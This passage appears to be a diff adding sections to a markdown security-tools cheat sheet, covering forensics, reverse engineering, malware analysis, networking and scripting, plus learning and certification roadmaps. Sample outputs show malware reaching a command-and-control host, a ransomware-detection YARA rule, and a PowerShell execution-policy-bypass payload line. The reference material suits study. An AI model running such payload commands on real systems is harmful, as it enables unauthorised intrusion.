+
+```bash
+root@kali:~$ volatility -f mem.raw imageinfo
+Volatility Foundation Volatility Framework 2.6
+Suggested Profile(s): Win10x64_19041, Win10x64_18362
+
+root@kali:~$ volatility -f mem.raw --profile=Win10x64_19041 pstree
+Name                    Pid  PPid
+.System                   4     0
+..smss.exe              544     4
+..svchost.exe          1232   808
+..explorer.exe         3120  1088
+...chrome.exe          2984  3120
+...malware.exe         3440  3120   ← suspicious!
+
+root@kali:~$ volatility -f mem.raw --profile=Win10x64_19041 cmdline -p 3440
+Process: malware.exe
+CommandLine: C:\Users\Admin\AppData\Roaming\malware.exe --connect 185.x.x.x:4444
+```
+
+---
+
+## 10. Reverse Engineering
+
+**Used for:** Malware analysis, binary reversing, assembly-level code inspection.
+
+| Tool | Description | Example Command |
+|------|-------------|-----------------|
+| **Ghidra** | NSA-developed reverse engineering suite | GUI-based |
+| **radare2** | CLI framework for binary analysis | `r2 -A ./binary` |
+| **IDA Free** | Industry-standard disassembler (free version) | GUI-based |
+| **strings** | Extract printable strings from binaries | `strings -n 8 malware.exe` |
+| **objdump** | Disassemble ELF binaries | `objdump -d -M intel ./binary` |
+
+### 💻 Snapshot: strings + radare2
+
+```bash
+root@kali:~$ strings -n 8 suspicious.exe | grep -E "(http|cmd|pass|key)"
+http://185.x.x.x/beacon
+cmd.exe /c whoami
+password123
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+
+root@kali:~$ r2 -A suspicious.exe
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze function calls (aac)
+[0x00401000]> afl | head
+0x00401000  fcn.entry0
+0x00401080  fcn.download_payload
+0x004010f0  fcn.establish_persistence
+0x00401200  fcn.encrypt_files
+
+[0x00401000]> pdf @ fcn.establish_persistence
+```
+
+---
+
+## 11. Linux System Monitoring & Admin
+
+**Used for:** Monitoring running processes, network connections, disk I/O, and system logs.
+
+| Tool | Description | Example Command |
+|------|-------------|-----------------|
+| **htop** | Interactive process viewer | `htop` |
+| **top** | Built-in process monitor | `top` |
+| **iftop** | Real-time network bandwidth monitor | `iftop -i eth0` |
+| **iotop** | Disk I/O monitor per process | `iotop -o` |
+| **journalctl** | Query systemd journal logs | `journalctl -u ssh -n 50 -f` |
+| **systemctl** | Manage systemd services | `systemctl status nginx` |
+| **netstat** | Network connections and routing | `netstat -tulpn` |
+| **ss** | Modern socket statistics tool | `ss -tulpn` |
+| **lsof** | List open files and sockets | `lsof -i :80` |
+
+---
+
+## 12. Networking Tools
+
+**Used for:** Diagnosing connectivity, DNS queries, routing, and network performance.
+
+| Tool | Description | Example Command |
+|------|-------------|-----------------|
+| **ping** | ICMP host reachability test | `ping -c 4 8.8.8.8` |
+| **traceroute** | Trace packet route to destination | `traceroute google.com` |
+| **dig** | DNS query tool | `dig target.com ANY` |
+| **nslookup** | DNS lookup utility | `nslookup -type=MX target.com` |
+| **iperf** | Network bandwidth measurement | `iperf3 -c 192.168.1.1` |
+| **arp** | ARP table management | `arp -a` |
+| **ifconfig** | Network interface configuration (legacy) | `ifconfig eth0` |
+| **ip** | Modern network interface tool | `ip addr show` |
+| **route** | Routing table management | `route -n` |
+| **mtr** | Combined ping + traceroute | `mtr google.com` |
+
+---
+
+## 13. Malware Analysis
+
+**Used for:** Static and dynamic malware analysis, pattern matching, and sandboxed execution.
+
+| Tool | Description | Example Command |
+|------|-------------|-----------------|
+| **YARA** | Pattern matching for malware classification | `yara rules.yar suspicious.exe` |
+| **Cuckoo Sandbox** | Automated dynamic malware analysis | `cuckoo submit malware.exe` |
+| **PEStudio** | Static PE file analysis (Windows) | GUI-based |
+| **REMnux** | Linux distro for reverse-engineering malware | Full toolkit |
+
+### 💻 Snapshot: YARA Rule Matching
+
+```bash
+root@kali:~$ cat detect_ransomware.yar
+rule DetectRansomware {
+    meta:
+        author = "SecurityTeam"
+        description = "Detects common ransomware strings"
+    strings:
+        $a = "YOUR FILES HAVE BEEN ENCRYPTED"
+        $b = "bitcoin" nocase
+        $c = ".locked" nocase
+        $d = { 52 61 6E 73 6F 6D }   // "Ransom" in hex
+    condition:
+        2 of ($a, $b, $c, $d)
+}
+
+root@kali:~$ yara detect_ransomware.yar /suspicious/
+DetectRansomware /suspicious/malware.exe   ← MATCH FOUND
+```
+
+---
+
+## 14. Containers / Cloud / DevSecOps
+
+**Used for:** Securing Docker/Kubernetes environments, container image scanning, and runtime monitoring.
+
+| Tool | Description | Example Command |
+|------|-------------|-----------------|
+| **Docker** | Container platform | `docker ps -a` |
+| **Kubernetes** | Container orchestration | `kubectl get pods --all-namespaces` |
+| **Trivy** | Container and filesystem vulnerability scanner | `trivy image nginx:latest` |
+| **kube-bench** | CIS Kubernetes benchmark checker | `kube-bench run --targets master` |
+| **Falco** | Runtime security for containers | `falco -r rules.yaml` |
+
+### 💻 Snapshot: Trivy Container Scan
+
+```bash
+root@kali:~$ trivy image nginx:1.21
+
+nginx:1.21 (debian 11.3)
+========================
+Total: 182 (UNKNOWN: 0, LOW: 91, MEDIUM: 61, HIGH: 27, CRITICAL: 3)
+
+CRITICAL:
+┌─────────────┬────────────┬──────────┬─────────────┬────────────────────────┐
+│   Library   │    CVE     │ Severity │  Installed  │         Title          │
+├─────────────┼────────────┼──────────┼─────────────┼────────────────────────┤
+│ openssl     │ CVE-2022-0 │ CRITICAL │ 1.1.1k-1    │ Integer overflow in BN │
+│ zlib        │ CVE-2018-2 │ CRITICAL │ 1:1.2.11.d  │ Out-of-bounds pointer  │
+└─────────────┴────────────┴──────────┴─────────────┴────────────────────────┘
+```
+
+---
+
+## 15. Programming & Scripting
+
+**Used for:** Automating attacks, writing custom exploits, building tools, and scripting repetitive tasks.
+
+| Language | Use in Security | Getting Started |
+|----------|-----------------|-----------------|
+| **Python** | Exploit scripts, automation, tool development | `python3 exploit.py` |
+| **Bash** | System automation, one-liners, recon scripts | `bash recon.sh target.com` |
+| **Perl** | Legacy exploit code, text processing | `perl -e 'print "A"x100'` |
+| **PowerShell** | Windows post-exploitation, Active Directory | `powershell -exec bypass -file payload.ps1` |
+| **Git** | Version control, exploit/tool repositories | `git clone https://github.com/...` |
+
+---
+
+## 🗺️ Learning Roadmap
+
+### 🟢 Beginner — Start Here
+
+> Focus on fundamentals: Linux, networking concepts, and basic scanning.
+
+| Order | Tool | Why Learn It First |
+|-------|------|--------------------|
+| 1 | **Linux Terminal** | Foundation of all security work |
+| 2 | **Nmap** | Core reconnaissance skill |
+| 3 | **Wireshark** | Understanding how traffic flows |
+| 4 | **Burp Suite** | Web security interception |
+| 5 | **Hydra** | Brute force fundamentals |
+| 6 | **Gobuster** | Directory and file enumeration |
+| 7 | **Netcat** | Raw TCP/UDP connectivity |
+| 8 | **Metasploit Basics** | Structured exploitation |
+
+**Resources:**
+- [TryHackMe](https://tryhackme.com) — Beginner-friendly guided rooms
+- [OverTheWire: Bandit](https://overthewire.org/wargames/bandit/) — Linux fundamentals via CTF
+- [Hack The Box Starting Point](https://app.hackthebox.com/starting-point)
+
+---
+
+### 🔵 Intermediate — Level Up
+
+> Deepen skills in web attacks, wireless auditing, and password cracking. Start CTFs.
+
+| Order | Tool | Skills Gained |
+|-------|------|---------------|
+| 1 | **sqlmap** | Automated SQL injection |
+| 2 | **Aircrack-ng** | Wi-Fi security and handshake capture |
+| 3 | **John the Ripper** | Offline hash cracking |
+| 4 | **Hashcat** | GPU-accelerated password recovery |
+| 5 | **OWASP ZAP** | Automated web vulnerability scanning |
+| 6 | **Bettercap** | Network MITM and ARP poisoning |
+| 7 | **tcpdump** | CLI packet analysis and filtering |
+
+**Resources:**
+- [Hack The Box](https://hackthebox.com) — Real pentest scenarios
+- [VulnHub](https://vulnhub.com) — Downloadable vulnerable VMs
+- [PentesterLab](https://pentesterlab.com) — Web app security focus
+
+---
+
+### 🟣 Advanced — Specialist Level
+
+> Specialise in reverse engineering, forensics, or cloud security. Write custom exploits. Bug bounty.
+
+| Order | Tool | Specialisation |
+|-------|------|----------------|
+| 1 | **Ghidra** | Binary reverse engineering |
+| 2 | **Volatility** | Memory forensics and IR |
+| 3 | **Empire** | Post-exploitation and C2 |
+| 4 | **Cuckoo Sandbox** | Malware dynamic analysis |
+| 5 | **Kubernetes Security** | Cloud attack surfaces |
+| 6 | **Malware Analysis Stack** | YARA + PEStudio + REMnux |
+
+**Resources:**
+- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
+- [Malware Traffic Analysis](https://malware-traffic-analysis.net/)
+- [HackerOne Bug Bounty Programs](https://hackerone.com/bug-bounty-programs)
+- [SANS Reading Room](https://www.sans.org/white-papers/)
+
+---
+
+## 📚 Certifications Roadmap
+
+```
+Entry Level:    CompTIA Security+ → CompTIA Network+
+Intermediate:   CEH (Certified Ethical Hacker) → eJPT (eLearnSecurity)
+Professional:   OSCP (Offensive Security) → PNPT (TCM Security)
+Advanced:       OSCE3 → GREM (Malware Analysis) → GCFA (Forensics)
+```
+
+---
+
+## ⚖️ Legal & Ethical Guidelines
+
+1. **Always get written authorization** before testing any system.
+2. **Stay within scope** — never test systems outside agreed targets.
+3. **Report findings responsibly** — follow coordinated disclosure.
+4. **Practice only in legal environments** — your own lab, VulnHub VMs, HTB, TryHackMe.
+5. **Know your local laws** — UK Computer Misuse Act, US CFAA, IT Act 2000 (India), etc.
+
+---
+
+*Generated for educational purposes. Use responsibly.*
